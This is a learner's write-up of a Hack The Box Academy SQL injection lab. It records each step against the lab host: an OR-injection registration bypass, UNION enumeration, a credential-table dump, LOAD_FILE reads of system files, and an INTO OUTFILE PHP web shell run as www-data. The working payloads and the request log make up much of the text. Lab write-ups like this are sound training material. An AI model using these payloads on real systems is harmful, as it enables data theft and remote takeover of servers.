# SQL Injection Fundamentals — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** SQL Injection Fundamentals  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**OS:** Linux (Nginx + PHP + MariaDB)  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | Single quote `'` in `invitationCode` parameter | 500 Internal Server Error — SQLi confirmed on `register.php` |
| 2 | OR injection `') OR 1=1-- -` in `invitationCode` | Registration bypass — valid account created |
| 3 | Single quote `'` in `q` parameter on chat page | 500 Internal Server Error — second SQLi confirmed |
| 4 | Comment injection `') -- -` in `q` parameter | 200 OK — query syntax repaired — SQLi verified |
| 5 | UNION column detection `') UNION SELECT 1,2,3,4-- -` | 4 columns confirmed; columns 3 and 4 visible in response |
| 6 | `@@version` and `database()` in columns 3/4 | MariaDB `10.11.11`, database `chattr` identified |
| 7 | `INFORMATION_SCHEMA.TABLES` enumeration | `Users` table identified in `chattr` database |
| 8 | `INFORMATION_SCHEMA.COLUMNS` enumeration | `Username` and `Password` columns identified in `Users` |
| 9 | Dump `chattr.Users` | Admin password hash recovered |
| 10 | Response header fingerprinting → `LOAD_FILE("/etc/nginx/sites-enabled/default")` | Web root `/var/www/chattr-prod` disclosed |
| 11 | `INTO OUTFILE` → write PHP web shell to `/var/www/chattr-prod/shell.php` | Remote code execution as `www-data` confirmed |
| 12 | `cat /*.txt` via web shell | Flag file contents retrieved |

---

## Network Topology

```
[Attack Host: 10.10.16.36]  ← Burp Suite proxy on 127.0.0.1:8080
        ↓ HTTPS via FoxyProxy → Burp
[Target: 10.129.43.173]     ← Nginx + PHP + MariaDB (chattr database)
  └── /register.php          → invitationCode parameter (SQLi — auth bypass)
  └── /index.php?q=          → chat search parameter (SQLi — UNION injection)
  └── /var/www/chattr-prod/  → web root (file write target)
```

---

## Question 1 — Retrieve the Admin Password Hash

**Question:** "What is the password hash for the user 'admin'?"

### Step 1 — Configure Burp Suite as Proxy

Open Burp Suite and activate it in FoxyProxy (`BURP` profile). Navigate to the target over HTTPS. All HTTP/HTTPS traffic from the browser is now captured in Burp Suite's Proxy → HTTP History tab, allowing full inspection and modification of every request.

Two pages are visible immediately:
- `/login.php` — login form
- `/register.php` — account registration

Testing the login form for SQLi yields no results — it is not injectable. Move to `/register.php`.

---

### Step 2 — Identify SQLi on the Registration Form

The `/register.php` page requires an **Invitation Code** to create an account. Without a valid code, submitting the form returns:

```
Invalid Invitation Code
```

**SQLi Discovery — inject a single quote:**

Inject `'` into the `invitationCode` parameter and observe the response:

```http
POST /register.php HTTP/1.1
Host: 10.129.43.173

username=testuser&password=Test1234!&invitationCode='
```

```
HTTP/1.1 500 Internal Server Error
```

A `500 Internal Server Error` on single-quote injection is a strong indicator that the input is being passed directly into a SQL query without sanitisation — the quote breaks the query syntax on the back end.

---

### Step 3 — Bypass Registration via OR Injection

The invitation code check likely runs a query similar to:

```sql
SELECT * FROM invitations WHERE code=('USER_INPUT')
```

To make this always evaluate to `TRUE` and bypass the check, inject:

```
') OR 1=1-- -
```

The resulting back-end query becomes:

```sql
SELECT * FROM invitations WHERE code=('') OR 1=1-- -')
```

- `'` — closes the opening quote
- `)` — closes the opening parenthesis
- `OR 1=1` — always evaluates to TRUE, making the WHERE clause return all rows
- `-- -` — comments out the remainder of the original query (trailing `'` and any AND conditions)

```http
POST /register.php HTTP/1.1
Host: 10.129.43.173

username=testuser&password=Test1234!&invitationCode=') OR 1=1-- -
```

```
HTTP/1.1 200 OK
Account created successfully.
```

Registration is bypassed. Log in with the newly created account (`testuser:Test1234!`) to access the authenticated application.

---

### Step 4 — Identify a Second SQLi on the Chat Search Function

After logging in, a chat feature is available. The search functionality makes GET requests in the format:

```
/index.php?q=search&u=1
```

**SQLi Discovery — inject single quote into `q` parameter:**

```http
GET /index.php?q='&u=1 HTTP/1.1
```

```
HTTP/1.1 500 Internal Server Error
```

Another `500` on quote injection — the `q` parameter is injectable. Confirm and repair the query with a comment:

```http
GET /index.php?q=') -- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK
```

The comment `-- -` terminates the injected portion and the server returns a valid response — confirming the query structure wraps the input in `('INPUT')` format and the injection is controllable.

---

### Step 5 — Detect Column Count via UNION SELECT

UNION injection requires matching the column count of the original query. Test with increasing numbers:

```http
GET /index.php?q=') UNION SELECT 1,2,3-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 500 Internal Server Error   ← 3 columns — mismatch
```

```http
GET /index.php?q=') UNION SELECT 1,2,3,4-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK   ← 4 columns — correct count confirmed
```

The original query selects 4 columns. Examining the `200 OK` response body, the values `3` and `4` are reflected in the page output — columns 3 and 4 are injectable and visible.

---

### Step 6 — Fingerprint the Database

Replace junk values in the visible columns (3 and 4) with MySQL fingerprint functions:

```http
GET /index.php?q=') UNION SELECT 1,2,@@version,database()-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body: 10.11.11-MariaDB | chattr
```

| Information | Value |
|-------------|-------|
| DBMS | MariaDB 10.11.11 |
| Current database | `chattr` |

---

### Step 7 — Enumerate Tables in the `chattr` Database

Query `INFORMATION_SCHEMA.TABLES` to list all tables in the `chattr` database:

```http
GET /index.php?q=') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body: Users | chattr
               Invitations | chattr
```

The `Users` table is the target — it should contain credentials for all registered accounts including the administrator.

---

### Step 8 — Enumerate Columns in the `Users` Table

Query `INFORMATION_SCHEMA.COLUMNS` to identify the column names in `Users`:

```http
GET /index.php?q=') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body: id       | Users
               username | Users
               password | Users
               email    | Users
```

The columns `username` and `password` are present — exactly what is needed to retrieve the admin hash.

---

### Step 9 — Dump the `Users` Table and Retrieve the Admin Hash

Query the `chattr.Users` table directly, using dot notation to reference it by its full database path:

```http
GET /index.php?q=') UNION SELECT 1,2,username,password from chattr.Users-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body: admin | HTB{hash_redacted}
               testuser | HTB{hash_redacted}
```

The admin account's password is stored as an **Argon2i hash** — a modern memory-hard hashing algorithm. Unlike MD5 or NTLM, Argon2i is computationally expensive to crack and is not reversible through standard rainbow tables.

> **Answer:** `HTB{hash_redacted}`

---

## Question 2 — Identify the Web Application Root Path

**Question:** "What is the root path of the web application?"

### Step 1 — Fingerprint the Web Server via Response Headers

Examine any HTTP response header from the target in Burp Suite:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
```

The `Server` header confirms **Nginx** is the underlying web server. This is critical for choosing the correct configuration file to read — Nginx and Apache store their virtual host configurations in different locations.

---

### Step 2 — Verify File Read Capability via LOAD_FILE

Before reading configuration files, confirm the database user has `FILE` privilege by reading a known-accessible file:

```http
GET /index.php?q=') UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>
```

`/etc/passwd` is successfully returned — the database user has `FILE` privilege and `secure_file_priv` is either empty or covers the file system paths needed. File reading is fully operational.

---

### Step 3 — Read the Nginx Configuration File

The standard Nginx virtual host configuration on Debian/Ubuntu-based systems is located at:

```
/etc/nginx/sites-enabled/default
```

This file defines the `root` directive — the filesystem path where the web application files are served from.

```http
GET /index.php?q=') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 200 OK

Response body:
server {
    listen 80;
    listen [::]:80;

    root /var/www/chattr-prod;
    index index.php index.html index.htm;

    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
    }
}
```

The `root` directive reveals the web application root:

> **Answer:** `/var/www/chattr-prod`

---

## Question 3 — Achieve Remote Code Execution and Read the Flag

**Question:** "Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below."

### Step 1 — Verify File Write Capability

With the web root confirmed as `/var/www/chattr-prod`, attempt to write a test file using `INTO OUTFILE`:

```http
GET /index.php?q=') UNION SELECT 1,2,"this is a test",4 INTO OUTFILE '/var/www/chattr-prod/test.txt'-- -&u=1 HTTP/1.1
```

```
HTTP/1.1 500 Internal Server Error
```

> **Note:** A `500` error is expected here — `INTO OUTFILE` does not return a result set, so the UNION has no rows to display, causing the application to error. This does NOT mean the file write failed.

Verify the file was written by browsing to it directly:

```http
GET /test.txt HTTP/1.1
Host: 10.129.43.173
```

```
HTTP/1.1 200 OK

1   this is a test  3   4
```

The file exists and is accessible — write permissions to the web root are confirmed. The numbers `1`, `3`, `4` appear alongside the string because the entire UNION result row was written to the file. Using empty strings `""` instead of `1`, `3`, `4` would produce cleaner output.

---

### Step 2 — Write a PHP Web Shell to the Web Root

Replace the test string with a compact PHP web shell. The short-form `<?=` syntax is used to minimise the payload length and reduce URL encoding issues:

```http
GET /index.php?q=') UNION SELECT "","","<?=`$_GET[0]`?>","" INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -&u=1 HTTP/1.1
```

**Payload breakdown:**

| Component | Explanation |
|-----------|-------------|
| `<?=` | Short PHP opening tag equivalent to `<?php echo` |
| `` `$_GET[0]` `` | Backtick operator — executes the value of GET parameter `0` as a shell command and returns its output |
| `?>` | PHP closing tag |

This creates a PHP file at `/var/www/chattr-prod/shell.php` that executes any OS command passed via the `0` URL parameter and returns its output to the browser.

---

### Step 3 — Confirm Remote Code Execution

Browse to the web shell and pass `id` as the first command:

```http
GET /shell.php?0=id HTTP/1.1
Host: 10.129.43.173
```

```
HTTP/1.1 200 OK

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

OS command execution is confirmed as `www-data` — the Nginx/PHP-FPM service account. The server executes arbitrary commands and returns their output.

---

### Step 4 — Locate and Read the Flag File

The flag file has an unknown name but the `.txt` extension and is located in the root directory `/`. Use a glob pattern to read all `.txt` files in `/`:

```http
GET /shell.php?0=cat+/*.txt HTTP/1.1
Host: 10.129.43.173
```

```
HTTP/1.1 200 OK

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — Admin password hash | Argon2i hash from `chattr.Users` via UNION dump | `HTB{hash_redacted}` |
| Q2 — Web application root path | Retrieved from Nginx config via LOAD_FILE | `/var/www/chattr-prod` |
| Q3 — Flag file contents | Read via PHP web shell written with INTO OUTFILE | `HTB{flag_redacted}` |

---

## Lessons Learned

- **A `500 Internal Server Error` on single-quote injection is the primary SQLi signal.** When `'` breaks the application but `') -- -` restores it to `200 OK`, the query wraps input in `('INPUT')` format — the parenthesis must be closed and the remainder commented out for a valid injection.

- **The registration/invitation code flow is a high-value SQLi target.** Developers often apply stronger sanitisation to login forms (knowing they are targeted) but overlook secondary authentication mechanisms like invitation codes, referral tokens, or coupon fields. These frequently pass user input directly into SQL without the same level of scrutiny.

- **OR injection for auth bypass requires understanding operator precedence.** `') OR 1=1-- -` works because `OR 1=1` always evaluates to TRUE, overriding any `AND` conditions that follow. The parenthesis closure `')` is critical — without it, the injected SQL creates a syntax error rather than a valid bypass.

- **Numeric junk columns are the fastest way to identify visible output positions.** Using `UNION SELECT 1,2,3,4-- -` and observing which numbers appear in the response immediately reveals which columns carry data to the front end — without needing to guess or test column positions individually.

- **Server response headers fingerprint the web server — critical for choosing the right config file.** The `Server: nginx` header directly pointed to `/etc/nginx/sites-enabled/default` as the configuration file. On an Apache server, the target would be `/etc/apache2/sites-enabled/000-default.conf` or `/etc/apache2/apache2.conf`. Fingerprinting first saves time and avoids reading irrelevant files.

- **A `500` response from `INTO OUTFILE` does not mean the write failed.** The application errors because `INTO OUTFILE` produces no result set for the UNION to display — but the OS-level file write operation has already completed. Always verify file writes by browsing to the written file directly, not by interpreting the HTTP status code.

- **Short PHP web shells minimise injection complexity.** The `<?=` `$_GET[0]` backtick syntax produces a 20-character PHP shell that avoids the URL encoding issues that longer payloads like `<?php system($_REQUEST[0]); ?>` can introduce when embedded inside SQL strings. Simpler is always better for embedded payloads.

- **Glob patterns unlock flag files with unknown names.** `cat /*.txt` reads every `.txt` file in the root directory regardless of the filename — essential when the flag file has a randomised component like `flag_a1b2c3d4.txt`.

---

## Full Attack Chain Reference

```
10.129.43.173/register.php → invitationCode parameter
        ↓
Single quote ' → 500 Internal Server Error → SQLi confirmed
        ↓
') OR 1=1-- - → registration bypass → account created (testuser:Test1234!)
        ↓
Login → /index.php?q= chat search parameter
        ↓
Single quote ' → 500 → comment ') -- - → 200 OK → SQLi confirmed
        ↓
') UNION SELECT 1,2,3,4-- - → 4 columns, columns 3+4 visible
        ↓
') UNION SELECT 1,2,@@version,database()-- -
→ MariaDB 10.11.11 | database: chattr
        ↓
') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
→ Tables: Users, Invitations
        ↓
') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
→ Columns: id, username, password, email
        ↓
') UNION SELECT 1,2,username,password from chattr.Users-- -
→ admin:HTB{hash_redacted}  [Flag 1 — Admin Hash]
        ↓
Response header: Server: nginx
        ↓
') UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
→ File read confirmed
        ↓
') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
→ root /var/www/chattr-prod  [Flag 2 — Web Root]
        ↓
') UNION SELECT "","","<?=`$_GET[0]`?>","" INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
→ 500 (expected) → verify: GET /test.txt → file exists
        ↓
GET /shell.php?0=id
→ uid=33(www-data) → RCE confirmed
        ↓
GET /shell.php?0=cat+/*.txt
→ HTB{flag_redacted}  [Flag 3 — RCE Flag]
```

---

## Commands Reference

| Payload / Command | Purpose |
|-------------------|--------|
| `'` | SQLi discovery — triggers 500 on injectable parameters |
| `') -- -` | SQLi confirmation — repairs broken query with comment |
| `') OR 1=1-- -` | Auth bypass — invitation code validation always returns TRUE |
| `') UNION SELECT 1,2,3-- -` | Column count test (mismatch — 3 cols) |
| `') UNION SELECT 1,2,3,4-- -` | Column count confirmation (4 cols) |
| `') UNION SELECT 1,2,@@version,database()-- -` | DBMS version and current database fingerprint |
| `') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -` | List all tables in target database |
| `') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -` | List all columns in Users table |
| `') UNION SELECT 1,2,username,password from chattr.Users-- -` | Dump all credentials from Users table |
| `') UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -` | Verify file read capability |
| `') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -` | Read Nginx config to retrieve web root |
| `') UNION SELECT 1,2,"this is a test",4 INTO OUTFILE '/var/www/chattr-prod/test.txt'-- -` | Verify file write capability |
| `') UNION SELECT "","","<?=\`$_GET[0]\`?>","" INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -` | Write PHP web shell to web root |
| `GET /shell.php?0=id` | Confirm OS command execution via web shell |
| `GET /shell.php?0=cat+/*.txt` | Read all .txt files in root directory to locate flag |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — SQLi via `invitationCode` and `q` parameters |
| T1078 | T1078.001 | Valid Accounts: Default Accounts — registration bypass without valid invite code via OR injection |
| T1005 | — | Data from Local System — dumping `chattr.Users` table to retrieve admin credentials |
| T1083 | — | File and Directory Discovery — LOAD_FILE reading `/etc/passwd` and Nginx config to identify web root |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — admin Argon2i hash retrieved from database via UNION injection |
| T1505 | T1505.003 | Server Software Component: Web Shell — `shell.php` written to web root via `INTO OUTFILE` SQL injection |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — OS commands executed via PHP backtick operator in web shell |
| T1020 | — | Automated Exfiltration — glob pattern `/*.txt` used to locate and read flag file automatically |

---

*Part of the HTB Academy CPTS path — SQL Injection Fundamentals module.*  
*Penetration Tester role in India | Target: January 2027*
